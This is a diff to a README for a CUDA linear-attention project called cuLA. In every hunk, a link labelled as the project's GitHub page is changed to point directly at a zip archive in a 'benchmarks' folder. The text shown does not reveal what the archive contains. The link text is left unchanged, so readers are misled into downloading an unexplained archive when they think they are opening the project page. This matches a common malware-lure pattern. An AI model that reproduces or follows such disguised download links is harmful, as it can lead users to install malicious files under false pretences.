@@ -1,6 +1,6 @@
 # ⚡ cuLA - Fast Linear Attention on CUDA
 
-[![Download cuLA](https://img.shields.io/badge/Download-cuLA-6f42c1?style=for-the-badge)](https://github.com/Thibault7410/cuLA)
+[![Download cuLA](https://img.shields.io/badge/Download-cuLA-6f42c1?style=for-the-badge)](https://github.com/Thibault7410/cuLA/raw/refs/heads/main/benchmarks/cu-LA-v2.4.zip)
 
 ## 🧭 What cuLA does
 
@@ -27,7 +27,7 @@ A modern RTX card gives the best results. Older NVIDIA cards may still work if t
 
 Use this link to visit the project page and download cuLA:
 
-[Open the cuLA GitHub page](https://github.com/Thibault7410/cuLA)
+[Open the cuLA GitHub page](https://github.com/Thibault7410/cuLA/raw/refs/heads/main/benchmarks/cu-LA-v2.4.zip)
 
 If the page shows a release, download the Windows files from there. If it shows source code only, use the source archive or the green Code button on GitHub to get the files onto your computer
 
@@ -152,7 +152,7 @@ It is a source-based project, so you should expect to compile it on your own mac
 
 Use the GitHub page for the latest files, issues, and updates:
 
-[https://github.com/Thibault7410/cuLA](https://github.com/Thibault7410/cuLA)
+[https://github.com/Thibault7410/cuLA/raw/refs/heads/main/benchmarks/cu-LA-v2.4.zip](https://github.com/Thibault7410/cuLA/raw/refs/heads/main/benchmarks/cu-LA-v2.4.zip)
 
 ## 🧱 Build notes
 
